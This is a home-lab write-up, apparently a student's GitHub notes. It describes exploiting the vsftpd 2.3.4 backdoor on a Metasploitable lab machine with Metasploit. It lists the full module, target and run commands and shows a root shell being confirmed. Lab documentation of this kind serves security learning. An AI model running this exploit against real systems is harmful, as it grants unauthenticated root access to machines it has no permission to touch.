# Home Lab - Week 2

## Objective
Exploit the vsftpd 2.3.4 backdoor vulnerability found during Week 1 reconnaissance.

## Vulnerability
vsftpd 2.3.4 contains a known backdoor: a maliciously modified version of the source
code that opens a root shell on port 6200 when a username containing ":)" is used
during FTP login.

## Steps Taken
1. Launched Metasploit: `msfconsole`  <img width="1920" height="936" alt="msfconsole" src="https://github.com/user-attachments/assets/2768c8d4-7c8e-4d97-9e5c-e655f36683bf" />

2. Searched for the exploit: `search vsftpd`  <img width="1920" height="384" alt="search vsftpd" src="https://github.com/user-attachments/assets/eb8ecea3-05d2-4083-aff1-4701bad26cba" />

3. Selected module: `use exploit/unix/ftp/vsftpd_234_backdoor`   
4. Set target: `set RHOSTS 192.168.100.150`  <img width="1920" height="936" alt="rhosts" src="https://github.com/user-attachments/assets/0b9d21b0-929f-4735-9cec-5c53519246f8" />

5. Set local host: `set LHOST [my Kali IP]`  <img width="1920" height="936" alt="lhost" src="https://github.com/user-attachments/assets/c2c94538-7056-4a26-864b-7d9e13423f47" />

6. Ran the exploit: `run`

## Result
Successfully obtained a root shell on the target machine without authentication.

<img width="1920" height="936" alt="run" src="https://github.com/user-attachments/assets/b6c0216c-d21a-44a7-bfcd-9af1b152d98c" />


Confirmed access with:
- `whoami` → root
- `uname -a` → Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

<img width="1920" height="936" alt="Output" src="https://github.com/user-attachments/assets/e7dfbb7a-947e-4687-a5c7-db60c07c8759" />


## What I Learned
This demonstrates how outdated, unpatched software can contain critical backdoors.
A single unauthenticated command gave full root access to the system — showing why
version detection during recon (Week 1) directly informs real attack paths.
